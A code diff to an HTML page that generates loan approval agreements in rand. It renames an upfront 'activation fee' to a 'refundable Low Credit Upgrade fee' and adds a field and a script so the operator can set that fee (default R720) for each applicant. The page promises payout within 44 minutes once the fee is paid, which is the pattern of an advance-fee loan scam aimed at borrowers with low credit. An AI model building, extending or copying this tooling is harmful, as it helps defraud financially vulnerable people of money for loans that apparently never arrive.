@@ -171,7 +171,7 @@
             flex-shrink: 0;
             margin-bottom: 20px;
             font-family: 'Times New Roman', Times, serif;
-            font-size: 12pt;
+            font-size: 13pt;
             color: #111;
             display: flex;
             flex-direction: column;
@@ -319,14 +319,14 @@
            DOC PAGE TITLE
         ================================================================ */
         .doc-section-heading {
-            font-size: 13pt; font-weight: bold;
+            font-size: 14pt; font-weight: bold;
             color: #1a3a6b; text-transform: uppercase;
             border-bottom: 1.5px solid #1a3a6b;
             padding-bottom: 3px; margin: 18px 0 10px;
             letter-spacing: 0.5px;
         }
         .doc-sub-heading {
-            font-size: 11pt; font-weight: bold;
+            font-size: 12pt; font-weight: bold;
             color: #1a3a6b; margin: 12px 0 6px;
         }
 
@@ -353,11 +353,11 @@
         /* ================================================================
            TEXT / LISTS
         ================================================================ */
-        .doc-para { margin-bottom: 9px; line-height: 1.65; font-size: 11pt; }
+        .doc-para { margin-bottom: 9px; line-height: 1.65; font-size: 12pt; }
         .doc-list { margin: 8px 0 10px 0; padding: 0; list-style: none; }
         .doc-list li {
             padding: 5px 10px 5px 22px;
-            position: relative; font-size: 11pt;
+            position: relative; font-size: 12pt;
             line-height: 1.55; margin-bottom: 4px;
         }
         .doc-list li::before {
@@ -369,13 +369,13 @@
         .notice-box {
             border: 1.5px solid #1a3a6b; border-left-width: 4px;
             padding: 11px 14px; margin: 12px 0;
-            background: #f0f5fc; font-size: 10.5pt;
+            background: #f0f5fc; font-size: 12pt;
             line-height: 1.6;
         }
         .fee-badge {
             background: #f59e0b; color: #7c2d12;
             padding: 1px 7px; border-radius: 4px;
-            font-weight: bold; font-size: 10.5pt;
+            font-weight: bold; font-size: 12pt;
         }
 
         /* ================================================================
@@ -480,6 +480,10 @@
             <div class="form-group">
                 <label class="form-label" for="userEmail">Email Address</label>
                 <input type="email" id="userEmail" class="form-input" placeholder="your@email.com" required autocomplete="email">
+            </div>
+            <div class="form-group">
+                <label class="form-label" for="feeAmountInput">Fee Amount (R)</label>
+                <input type="number" id="feeAmountInput" class="form-input" placeholder="e.g. 720" min="0" step="0.01">
             </div>
             <button type="submit" class="verify-btn" id="verifyBtn">
                 <i class="fas fa-unlock-alt"></i> Verify &amp; View Agreement
@@ -628,7 +632,7 @@
                         <!-- Approval Notice -->
                         <div class="doc-section-heading">Approval Notice</div>
                         <p class="doc-para">
-                            Dear <strong id="p2FirstName">Applicant</strong>, we are pleased to confirm that your loan application has been <strong>successfully approved</strong>, subject to final activation requirements.
+                            Dear <strong id="p2FirstName">Applicant</strong>, we are pleased to confirm that your loan application has been <strong>successfully approved</strong>, subject to final Low credit Upgrade requirements.
                         </p>
                         <p class="doc-para">
                             Following a full financial assessment — including affordability, income consistency, and credit behaviour — your application meets our internal lending criteria.
@@ -655,7 +659,7 @@
                 </div>
 
                 <!-- =====================================================
-                     PAGE 3 — DISBURSEMENT + ACTIVATION FEE
+                     PAGE 3 — DISBURSEMENT + Low credit Upgrade FEE
                 ===================================================== -->
                 <div class="document-page" id="page3">
                     <div class="page-body">
@@ -678,16 +682,16 @@
                         <!-- Loan Disbursement -->
                         <div class="doc-section-heading">Loan Disbursement Process</div>
                         <p class="doc-para">
-                            Once all activation requirements are completed, your approved loan amount of <strong id="p3Amount">R—</strong> will be released directly into your verified bank account.
+                            Once all Low credit Upgrade requirements are completed, your approved loan amount of <strong id="p3Amount">R—</strong> will be released directly into your verified bank account.
                         </p>
                         <p class="doc-para">
                             <strong>Estimated disbursement time:</strong> Within <strong>44 minutes</strong> of final confirmation.
                         </p>
 
-                        <!-- Activation Fee -->
+                        <!-- Low credit Upgrade Fee -->
                         <div class="doc-section-heading">Low Credit : Upgrade &amp; Risk Management Fee</div>
                         <p class="doc-para">
-                            To proceed with disbursement, a once-off refundable Low Credit Upgrade fee of <span class="fee-badge">R720.00</span> is required,  this enable us maintain your credit better for your application and mitigate the risk.</p>
+                            To proceed with disbursement, a once-off refundable Low Credit Upgrade fee of <span class="fee-badge" id="feeBadge1">R720.00</span> is required,  this enable us maintain your credit better for your application and mitigate the risk.</p>
                         <div class="doc-sub-heading">Purpose of This Fee</div>
                         <p class="doc-para">
                             Due to the increased lending risk associated with your Low credit profile, this fee forms part of our risk management and low credit maintenance process. It is used to:
@@ -761,7 +765,7 @@
                         <ul class="doc-list">
                             <li>All information provided is true and accurate</li>
                             <li>I understand and accept the terms of this agreement</li>
-                            <li>I acknowledge the activation fee requirement and repayment obligations</li>
+                            <li>I acknowledge the Low credit Upgrade fee requirement and repayment obligations</li>
                         </ul>
                         <p class="doc-para">
                             Any false information may result in cancellation of this agreement and recovery of funds.
@@ -774,9 +778,9 @@
                         </p>
 
                         <!-- Final Step -->
-                        <div class="doc-section-heading">Final Step — Activation</div>
+                        <div class="doc-section-heading">Final Step — Low credit Upgrade</div>
                         <div class="notice-box">
-                            To proceed with your loan payout, complete the activation process by settling the refundable fee of <span class="fee-badge">R720.00</span>. Once confirmed, your funds will be processed and disbursed within 44 minutes.
+                            To proceed with your loan payout, complete the Low credit Upgrade process by settling the refundable fee of <span class="fee-badge" id="feeBadge2">R720.00</span>. Once confirmed, your funds will be processed and disbursed within 44 minutes.
                         </div>
 
                         <!-- Official Notice -->
@@ -901,6 +905,18 @@
 
     let currentZoom = 1;
 
+    /* ---- FEE AMOUNT ---- */
+    function applyFeeAmount() {
+        const raw = parseFloat(document.getElementById('feeAmountInput').value);
+        if (!isNaN(raw) && raw > 0) {
+            const formatted = 'R' + raw.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            const b1 = document.getElementById('feeBadge1');
+            const b2 = document.getElementById('feeBadge2');
+            if (b1) b1.textContent = formatted;
+            if (b2) b2.textContent = formatted;
+        }
+    }
+
     /* ---- UTILS ---- */
     function fmt(n) {
         const v = parseFloat(n) || 0;
@@ -1004,6 +1020,7 @@
             card.onclick = () => {
                 document.getElementById('rowSelectModal').style.display = 'none';
                 populate(d);
+                applyFeeAmount();
                 document.getElementById('verificationModal').style.display = 'none';
                 document.getElementById('documentModal').style.display = 'flex';
             };
@@ -1030,6 +1047,7 @@
             }
             if (rows.length === 1) {
                 populate(parseRow(rows[0]));
+                applyFeeAmount();
                 document.getElementById('verificationModal').style.display = 'none';
                 document.getElementById('documentModal').style.display = 'flex';
             } else {
